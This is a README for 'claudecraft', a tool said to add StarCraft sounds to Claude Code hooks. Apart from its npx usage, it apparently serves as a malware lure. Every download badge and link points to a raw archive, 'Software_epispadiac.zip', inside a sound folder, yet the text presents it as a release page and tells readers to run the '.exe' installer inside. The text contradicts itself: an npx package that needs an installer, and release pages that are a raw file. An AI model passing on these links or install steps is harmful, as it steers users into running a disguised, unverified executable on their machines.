# 🎵 claudecraft - Add StarCraft Sounds Easily

[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-green)](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)

## 📦 What is claudecraft?

claudecraft is a simple tool that adds StarCraft sound effects to Claude Code hooks. It uses clear prompts to guide you through the installation process. This lets you customize how the sounds fit into your projects without needing programming skills.

With claudecraft, you can choose different settings like the sound preset, the race of StarCraft sounds, and the scope where the sounds apply. The tool runs on Windows and works from your command prompt.

---

## 🚀 Getting Started

This guide will walk you through downloading and running claudecraft on a Windows PC. Follow each step carefully, and you will have StarCraft sound effects working in minutes.

### Step 1: Download claudecraft

Visit the latest release page to get the claudecraft installer.

[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-blue)](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)

1. Open the link above in your web browser.
2. Look for the latest release version—usually listed at the top.
3. Find the Windows installer file. This will have a `.exe` extension.
4. Click on the file to download it to your computer.

The installer file size is small, so the download should finish quickly.

### Step 2: Run the Installer

1. Locate the downloaded `.exe` file, usually in your "Downloads" folder.
2. Double-click the file to start the setup.
3. Follow the instructions on the screen:
   - Agree to the terms if prompted.
   - Choose the destination folder or accept the default.
4. Click "Install" and wait for the process to finish.
5. Close the installer when it completes.

---

## 💻 How to Use claudecraft on Windows

After installation, you will run claudecraft using the Command Prompt, a program that lets you type commands.

### Opening the Command Prompt

1. Click the Start button or press the Windows key.
2. Type `cmd` and press Enter.
3. A black window will open. This is called the Command Prompt.

### Running claudecraft

Type the following and press Enter:

```
npx @wyverselabs/claudecraft
```

This command starts claudecraft in fully interactive mode. You will see clear prompts to guide you through installing StarCraft sounds.

### Common Commands

To install the sounds with specific options, type commands like these in Command Prompt and press Enter:

- Install sounds for your current project with expanded presets and random race sounds:

```
npx @wyverselabs/claudecraft install --scope project --preset expanded --race random
```

- Check for issues with the sounds installation:

```
npx @wyverselabs/claudecraft doctor --scope project
```

---

## ⚙️ Configuration Options Explained

claudecraft lets you change some settings to fit your needs. Here are common options:

- `--scope`: Choose where to apply sounds. Use `project` to add sounds only in your current project.
- `--preset`: Select the sound preset. `expanded` means more sound effects.
- `--race`: Pick a StarCraft race sound. Options are `protoss`, `terran`, `zerg`, or `random`.
- `--tool-cooldown`: Set cooldown time in seconds for sound tools. Defaults to 2 seconds.
- `--yes`: Run commands without asking confirmation.

These options let you control how claudecraft works without extra hassle.

---

## 🔧 Interactive Mode

Enter just:

```
npx @wyverselabs/claudecraft
```

You get an interactive menu with clear labels like “Install StarCraft sounds.” Use your keyboard arrows and Enter to choose options. This is the easiest way to use the tool.

---

## 🖥️ System Requirements

- Windows 10 or later.
- At least 1GB free disk space.
- Internet connection to download sound files on first run.
- Command Prompt access with permission to run programs.

---

## 🛠️ Troubleshooting

If claudecraft does not work as expected:

- Make sure you ran Command Prompt as a normal user, not an admin.
- Check your internet connection.
- Confirm you downloaded the latest installer from the releases page.
- Use this command to check your setup:

```
npx @wyverselabs/claudecraft doctor --scope project
```

It will check common problems and suggest fixes.

---

## 🎯 Additional Tips

- Running claudecraft in interactive mode helps if you’re unsure about settings.
- If you want to automate sound installs, use the full command with options.
- You can uninstall claudecraft by deleting the installed files or by removing the npm packages if you used npm.

---

## 📂 Where to Get claudecraft

You can always visit this page to download the latest version:

[https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)

Keep track of new releases here to stay updated.

---

## 📺 Demo

See claudecraft in action by watching the demo video included in the repository. It shows how the sounds install and play through the prompts.

---

## 🤖 Using claudecraft with npx (Advanced)

npx runs claudecraft directly without installing it permanently. This is a quick way to test or use the tool once.

Basic command:

```
npx @wyverselabs/claudecraft
```

Examples with options:

```
npx @wyverselabs/claudecraft install --scope project --preset expanded --race protoss --tool-cooldown 2 --yes
```

This installs Protoss race sounds with cooldown and no prompts.

---

## 🔄 Updating claudecraft

To update claudecraft when a new version is released:

1. Delete older installed versions (if any).
2. Download the new installer from the releases page.
3. Run the installer as before.

If you use npx, it always runs the latest published version automatically.

---

## 📖 More Help

If you want to learn more, visit the repository on GitHub. You will find full documentation and troubleshooting guides.

[https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)